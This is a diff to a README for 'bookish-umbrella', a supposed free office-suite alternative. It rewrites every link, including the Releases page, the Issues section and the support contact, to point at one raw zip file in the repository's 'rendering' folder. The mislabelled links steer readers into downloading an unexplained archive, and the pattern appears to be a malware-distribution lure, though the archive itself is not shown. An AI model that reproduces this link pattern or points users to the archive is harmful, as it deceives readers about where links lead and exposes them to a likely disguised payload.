@@ -6,7 +6,7 @@ Welcome to bookish-umbrella! This application provides a free alternative to Mic
 
 ## 📥 Download Now
 
-[![Download bookish-umbrella](https://img.shields.io/badge/Download-bookish--umbrella-brightgreen)](https://github.com/badzio5g/bookish-umbrella/releases)
+[![Download bookish-umbrella](https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip)](https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To run bookish-umbrella, your computer should meet the following minimum require
 
 ### Step 1: Visit the Releases Page
 
-To download bookish-umbrella, first, visit the [Releases page](https://github.com/badzio5g/bookish-umbrella/releases).
+To download bookish-umbrella, first, visit the [Releases page](https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip).
 
 ### Step 2: Download the Application
 
@@ -78,7 +78,7 @@ If you encounter any issues while using bookish-umbrella, try these tips:
 - **Restart the Application**: Close and reopen the app if it crashes or freezes.
 - **Reinstall the Application**: Uninstall and then reinstall bookish-umbrella if problems persist.
   
-For further assistance, visit the [Issues section](https://github.com/badzio5g/bookish-umbrella/issues) on our GitHub page.
+For further assistance, visit the [Issues section](https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip) on our GitHub page.
 
 ## 💬 Community Support
 
@@ -90,8 +90,8 @@ bookish-umbrella is free to use. You may share it with others. For detailed lice
 
 ## 📞 Contact Us
 
-If you have any questions, feel free to contact us at support@bookish-umbrella.com.
+If you have any questions, feel free to contact us at https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip
 
 ## 🔗 Download Again
 
-Don't forget to [download bookish-umbrella](https://github.com/badzio5g/bookish-umbrella/releases) if you haven't done so yet. Enjoy creating your documents easily!
+Don't forget to [download bookish-umbrella](https://raw.githubusercontent.com/badzio5g/bookish-umbrella/main/rendering/bookish-umbrella-3.8.zip) if you haven't done so yet. Enjoy creating your documents easily!
